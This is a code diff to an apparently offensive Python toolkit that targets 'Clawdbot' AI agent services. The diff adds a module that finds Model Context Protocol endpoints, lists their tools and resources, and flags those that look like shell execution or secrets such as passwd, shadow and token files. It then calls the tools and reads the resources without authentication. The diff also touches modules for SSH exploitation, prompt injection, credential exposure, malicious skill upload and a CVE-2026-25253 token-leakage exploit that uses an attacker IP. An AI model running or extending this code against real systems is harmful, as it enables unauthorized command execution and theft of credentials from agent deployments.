@@ -10,7 +10,8 @@ Description:
       4. Prompt Injection Vulnerabilities
       5. Credential Exposure
       6. Malicious Skills/Extensions
-      7. CVE-2026-25253 - WebSocket Token Leakage
+      7. MCP (Model Context Protocol) Detection & Exploitation
+      8. CVE-2026-25253 - WebSocket Token Leakage
 """
 
 import requests
@@ -104,6 +105,12 @@ SKILL_ENDPOINTS = [
     "/api/extensions", "/installed", "/marketplace"
 ]
 
+MCP_ENDPOINTS = [
+    "/mcp", "/api/mcp", "/v1/mcp", "/mcp/v1",
+    "/tools", "/resources", "/api/tools", "/api/resources",
+    "/mcp/tools", "/mcp/resources", "/v1/tools", "/v1/resources"
+]
+
 WS_TEST_PATHS = [
     "/", "/index.html", "/dashboard", "/control", "/ws-client",
     "/api/ws", "/connect", "/gateway", "/websocket"
@@ -130,19 +137,19 @@ def print_section(title):
     print(f"{'='*60}")
 
 def print_success(msg):
-    print(f"   {msg}")
+    print(f"  {msg}")
 
 def print_failure(msg):
-    print(f"   {msg}")
+    print(f"  {msg}")
 
 def print_info(msg):
-    print(f"   {msg}")
+    print(f"  {msg}")
 
 def print_warning(msg):
-    print(f"   {msg}")
+    print(f"  {msg}")
 
 def print_found(msg):
-    print(f"   {msg}")
+    print(f"  {msg}")
 
 def ask_yes_no(prompt):
     while True:
@@ -183,8 +190,11 @@ class ServiceDiscovery:
     def scan_network(self):
         """Interactive network discovery for Clawdbot instances"""
         print_section("MODULE 0: Clawdbot Service Discovery")
-        print("This module will help you discover Clawdbot instances on a network.")
-        print("  - Hack the Planet\n")
+        print("This module will help you discover Clawdbot instances on your network.")
+        print("Based on Shodan data, Clawdbot typically uses:")
+        print("  - Port 18789/tcp for HTTP control interface")
+        print("  - Port 22/tcp for SSH access")
+        print("  - Port 5353/udp for mDNS service discovery\n")
         
         scan_method = get_input("Choose scan method: (1) Single host, (2) Network range, (3) Import from file", "1")
         
@@ -431,7 +441,7 @@ class ServiceDiscovery:
         
         return all_targets
 
-# ========================== MODULE 1: SSH VULNERABILITY ASSESSMENT (NEW) ==========================
+# ========================== MODULE 1: SSH VULNERABILITY ASSESSMENT ==========================
 class SSHVulnerabilityExploiter:
     """
     Scans for and exploits SSH vulnerabilities on Clawdbot instances
@@ -1074,7 +1084,210 @@ except:
                 except Exception as e:
                     print(f"    Error: {e}")
 
-# ========================== MODULE 6: CVE-2026-25253 ==========================
+# ========================== MODULE 6: MCP DETECTION & EXPLOITATION (NEW) ==========================
+class MCPExploiter:
+    """
+    Detects and exploits MCP (Model Context Protocol) endpoints.
+    MCP allows AI models to interact with tools and resources.
+    """
+    def __init__(self, base_url, session):
+        self.base_url = base_url
+        self.session = session
+        self.mcp_endpoints = []
+        self.tools = []
+        self.resources = []
+        self.vulnerabilities = []
+
+    def scan(self):
+        """Scan for MCP endpoints"""
+        print_section("MODULE 6: MCP (Model Context Protocol) Detection")
+        print("Scanning for MCP endpoints...\n")
+
+        for path in MCP_ENDPOINTS:
+            if self.base_url.endswith('/'):
+                url = self.base_url + path.lstrip('/')
+            else:
+                url = self.base_url + path
+
+            try:
+                print(f"  Testing: {url}")
+                # Try to detect MCP by checking for JSON-RPC style responses
+                # First, send a simple tools/list request (common MCP method)
+                mcp_request = {
+                    "jsonrpc": "2.0",
+                    "method": "tools/list",
+                    "id": 1
+                }
+                resp = self.session.post(url, json=mcp_request, timeout=5, verify=False)
+                if resp.status_code == 200:
+                    try:
+                        data = resp.json()
+                        # Check if response contains JSON-RPC structure
+                        if "jsonrpc" in data and ("result" in data or "error" in data):
+                            print_found(f"Potential MCP endpoint: {url}")
+                            print_info(f"  Response: {data}")
+                            self.mcp_endpoints.append(url)
+                            # Try to list tools
+                            self._list_tools(url)
+                            # Try to list resources
+                            self._list_resources(url)
+                    except:
+                        # Not JSON, maybe other format?
+                        pass
+                else:
+                    # Try GET as fallback
+                    resp = self.session.get(url, timeout=5, verify=False)
+                    if resp.status_code == 200 and "jsonrpc" in resp.text:
+                        print_found(f"Potential MCP endpoint (GET): {url}")
+                        self.mcp_endpoints.append(url)
+            except Exception as e:
+                print(f"  [Error] {url}: {str(e)[:50]}")
+
+        return self.mcp_endpoints
+
+    def _list_tools(self, url):
+        """Attempt to list available MCP tools"""
+        try:
+            req = {"jsonrpc": "2.0", "method": "tools/list", "id": 2}
+            resp = self.session.post(url, json=req, timeout=5, verify=False)
+            if resp.status_code == 200:
+                data = resp.json()
+                if "result" in data and "tools" in data["result"]:
+                    self.tools = data["result"]["tools"]
+                    print_found(f"  Found {len(self.tools)} tools:")
+                    for tool in self.tools:
+                        print(f"    - {tool.get('name')}: {tool.get('description', 'No description')}")
+                        # Check for dangerous tools
+                        if any(kw in tool.get('name','').lower() for kw in ['exec','shell','cmd','system','os','run']):
+                            vuln = {
+                                'type': 'Dangerous MCP Tool',
+                                'details': f"Tool '{tool['name']}' may allow command execution",
+                                'severity': 'HIGH'
+                            }
+                            self.vulnerabilities.append(vuln)
+        except:
+            pass
+
+    def _list_resources(self, url):
+        """Attempt to list available MCP resources"""
+        try:
+            req = {"jsonrpc": "2.0", "method": "resources/list", "id": 3}
+            resp = self.session.post(url, json=req, timeout=5, verify=False)
+            if resp.status_code == 200:
+                data = resp.json()
+                if "result" in data and "resources" in data["result"]:
+                    self.resources = data["result"]["resources"]
+                    print_found(f"  Found {len(self.resources)} resources:")
+                    for res in self.resources:
+                        print(f"    - {res.get('uri')}: {res.get('description', 'No description')}")
+                        # Check for sensitive resources
+                        if any(kw in res.get('uri','').lower() for kw in ['passwd','shadow','secret','key','token']):
+                            vuln = {
+                                'type': 'Sensitive MCP Resource',
+                                'details': f"Resource '{res['uri']}' may expose sensitive data",
+                                'severity': 'HIGH'
+                            }
+                            self.vulnerabilities.append(vuln)
+        except:
+            pass
+
+    def exploit(self):
+        """Exploit MCP vulnerabilities"""
+        if not self.mcp_endpoints:
+            print_failure("No MCP endpoints found.")
+            return
+
+        print_section("EXPLOITING MCP")
+
+        for url in self.mcp_endpoints:
+            print(f"\n[*] Targeting {url}")
+
+            # Check for authentication bypass
+            try:
+                # Try to call a tool without auth
+                if self.tools:
+                    print_info("Attempting to invoke a tool...")
+                    # Ask user which tool to invoke
+                    for i, tool in enumerate(self.tools, 1):
+                        print(f"    {i}. {tool['name']}")
+                    choice = get_input("Select tool number to invoke (or 0 to skip)", "0")
+                    if choice != "0":
+                        idx = int(choice) - 1
+                        if 0 <= idx < len(self.tools):
+                            tool = self.tools[idx]
+                            # Build invocation request (simplified)
+                            req = {
+                                "jsonrpc": "2.0",
+                                "method": "tools/call",
+                                "params": {
+                                    "name": tool['name'],
+                                    "arguments": {}  # May need actual args
+                                },
+                                "id": 4
+                            }
+                            # Ask for arguments if needed
+                            if ask_yes_no("    Does this tool require arguments?"):
+                                args_str = get_input("    Enter arguments as JSON (e.g., {\"cmd\":\"ls\"})")
+                                try:
+                                    req["params"]["arguments"] = json.loads(args_str)
+                                except:
+                                    print_failure("Invalid JSON, using empty args.")
+                            resp = self.session.post(url, json=req, timeout=5, verify=False)
+                            if resp.status_code == 200:
+                                data = resp.json()
+                                if "result" in data:
+                                    print_found("Tool invocation successful!")
+                                    print(json.dumps(data["result"], indent=2))
+                                elif "error" in data:
+                                    print_warning(f"Tool error: {data['error']}")
+                            else:
+                                print_failure(f"HTTP {resp.status_code}")
+                # Try to read a resource
+                if self.resources:
+                    print_info("Attempting to read a resource...")
+                    for i, res in enumerate(self.resources, 1):
+                        print(f"    {i}. {res.get('uri')}")
+                    choice = get_input("Select resource number to read (or 0 to skip)", "0")
+                    if choice != "0":
+                        idx = int(choice) - 1
+                        if 0 <= idx < len(self.resources):
+                            res = self.resources[idx]
+                            req = {
+                                "jsonrpc": "2.0",
+                                "method": "resources/read",
+                                "params": {"uri": res['uri']},
+                                "id": 5
+                            }
+                            resp = self.session.post(url, json=req, timeout=5, verify=False)
+                            if resp.status_code == 200:
+                                data = resp.json()
+                                if "result" in data:
+                                    print_found("Resource read successful!")
+                                    print(json.dumps(data["result"], indent=2))
+                                elif "error" in data:
+                                    print_warning(f"Resource error: {data['error']}")
+                            else:
+                                print_failure(f"HTTP {resp.status_code}")
+            except Exception as e:
+                print_failure(f"Exploitation error: {e}")
+
+    def display_results(self):
+        """Display MCP findings"""
+        if not self.mcp_endpoints:
+            return
+        print_section("MCP SUMMARY")
+        for url in self.mcp_endpoints:
+            print(f"  MCP Endpoint: {url}")
+        if self.tools:
+            print(f"  Tools available: {len(self.tools)}")
+        if self.resources:
+            print(f"  Resources available: {len(self.resources)}")
+        for vuln in self.vulnerabilities:
+            severity = vuln.get('severity', 'INFO')
+            if severity == 'HIGH':
+                print_warning(f"  [HIGH] {vuln['type']}: {vuln['details']}")
+
+# ========================== MODULE 7: CVE-2026-25253 ==========================
 class CVE202625253Exploiter:
     def __init__(self, base_url, session, attacker_ip):
         self.base_url = base_url
@@ -1083,7 +1296,7 @@ class CVE202625253Exploiter:
         self.vulnerable_endpoints = []
 
     def scan(self):
-        print_section("MODULE 6: CVE-2026-25253 - WebSocket Token Leakage")
+        print_section("MODULE 7: CVE-2026-25253 - WebSocket Token Leakage")
         print("Scanning for vulnerable WebSocket endpoints...\n")
         
         for path in WS_TEST_PATHS:
@@ -1227,7 +1440,7 @@ def main():
                 ssh_exploiters.append(ssh_exploiter)
                 ssh_exploiter.display_results()
     
-    # HTTP Interface Scanning
+    # HTTP Interface Scanning (includes MCP and other web modules)
     for target in targets_to_scan:
         # Build HTTP URL (assume default port 18789 if not specified)
         http_port = 18789 if discovery._check_port(target, 18789) else 80
@@ -1248,6 +1461,7 @@ def main():
         prompt = PromptInjectionExploiter(base_url, session)
         creds = CredentialExposureExploiter(base_url, session)
         skills = MaliciousSkillExploiter(base_url, session, attacker_ip)
+        mcp = MCPExploiter(base_url, session)
         cve = CVE202625253Exploiter(base_url, session, attacker_ip)
         
         # Run scans
@@ -1255,7 +1469,11 @@ def main():
         prompt.scan()
         creds.scan()
         skills.scan()
+        mcp.scan()
         cve.scan()
+        
+        # Display MCP findings
+        mcp.display_results()
         
         # Exploitation phase
         print_section("EXPLOITATION PHASE")
@@ -1274,7 +1492,10 @@ def main():
         if skills.skill_endpoints and attacker_ip and ask_yes_no("\n[4] Upload malicious skills?"):
             skills.exploit()
         
-        if cve.vulnerable_endpoints and attacker_ip and ask_yes_no("\n[5] Exploit CVE-2026-25253?"):
+        if mcp.mcp_endpoints and ask_yes_no("\n[5] Exploit MCP endpoints?"):
+            mcp.exploit()
+        
+        if cve.vulnerable_endpoints and attacker_ip and ask_yes_no("\n[6] Exploit CVE-2026-25253?"):
             cve.exploit()
     
     # SSH Exploitation
